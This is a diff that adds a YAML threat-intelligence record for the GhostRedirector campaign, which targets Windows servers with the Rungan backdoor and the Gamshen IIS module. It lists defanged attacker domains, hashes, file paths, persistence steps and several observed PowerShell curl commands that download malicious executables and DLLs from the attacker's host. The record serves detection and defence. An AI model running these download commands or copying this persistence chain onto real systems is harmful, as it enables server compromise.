@@ -1,0 +1,62 @@
+description: GhostRedirector compromised Windows servers using a C++ backdoor (Rungan)
+  and an IIS module (Gamshen) to perform SEO fraud.
+attribution: China-aligned threat actor
+malware_families:
+- Rungan
+- Gamshen
+TTPs:
+  processes: []
+  commandline:
+  - cmd.exe /d /s /c "powershell curl https://xzs.868id[.]com/EfsNetAutoUser_br.exe
+    -OutFile C:\ProgramData\EfsNetAutoUser_br.exe"
+  - cmd.exe /d /s /c "powershell curl http://xz.868id[.]com/EfsPotato_sign.exe -OutFile
+    C:\ProgramData\EfsPotato_sign.exe"
+  - cmd.exe /d /s /c "powershell curl https://xzs.868id[.]com/link.exe -OutFile C:\ProgramData\link.exe"
+  - powershell curl https://xzs.868id[.]com/iis/br/ManagedEngine64_v2.dll -OutFile
+    C:\ProgramData\Microsoft\DRM\log\ManagedEngine64.dll
+  - powershell curl https://xzs.868id[.]com/iis/IISAgentDLL.dll -OutFile C:\ProgramData\Microsoft\DRM\log\miniscreen.dll
+  powershell:
+  - powershell curl https://xzs.868id[.]com/EfsNetAutoUser_br.exe -OutFile C:\ProgramData\EfsNetAutoUser_br.exe
+  - powershell curl http://xz.868id[.]com/EfsPotato_sign.exe -OutFile C:\ProgramData\EfsPotato_sign.exe
+  - powershell curl https://xzs.868id[.]com/link.exe -OutFile C:\ProgramData\link.exe
+  - powershell curl https://xzs.868id[.]com/iis/br/ManagedEngine64_v2.dll -OutFile
+    C:\ProgramData\Microsoft\DRM\log\ManagedEngine64.dll
+  - powershell curl https://xzs.868id[.]com/iis/IISAgentDLL.dll -OutFile C:\ProgramData\Microsoft\DRM\log\miniscreen.dll
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: Rungan
+    destination: http://+:80/v1.0/8888/sys.html
+    port: 80
+  - process: Gamshen
+    destination: https://brproxy.868id[.]com/index_base64.php?<ORIGINAL_URL>
+    port: 443
+  file_activity:
+  - C:\ProgramData\EfsNetAutoUser_br.exe
+  - C:\ProgramData\EfsPotato_sign.exe
+  - C:\ProgramData\link.exe
+  - C:\ProgramData\Microsoft\DRM\log\ManagedEngine64.dll
+  - C:\ProgramData\Microsoft\DRM\log\miniscreen.dll
+  - C:\ProgramData\Microsoft\DRM\log\miniscreen.dll
+  - C:\Windows\Microsoft.NET\Framework64\v2.0.50727\1033\vbskui.dll
+  persistence:
+  - Create privileged user via EfsPotato/BadPotato exploits
+  - Install Rungan in C:\ProgramData\Microsoft\DRM\log\miniscreen.dll
+  - Install Gamshen as native IIS module
+  - Deploy GoToHTTP for remote access
+  process_relations: []
+IOCs:
+  hashes:
+  - SHA-1: 28140A5A29EBA098BC6215DDAC8E56EACBB29B69
+  - SHA-1: 049C343A9DAAF3A93756562ED73375082192F5A8
+  domains:
+  - 868id[.]com
+  - brproxy.868id[.]com
+  - gobr.868id[.]com
+  ips: []
+authors:
+- Fernando Tavella
+reference: https://www.welivesecurity.com/en/eset-research/ghostredirector-poisons-windows-servers-backdoors-side-potatoes/
+date_of_publication: September 04, 2025
+file_creation_date: September 04, 2025
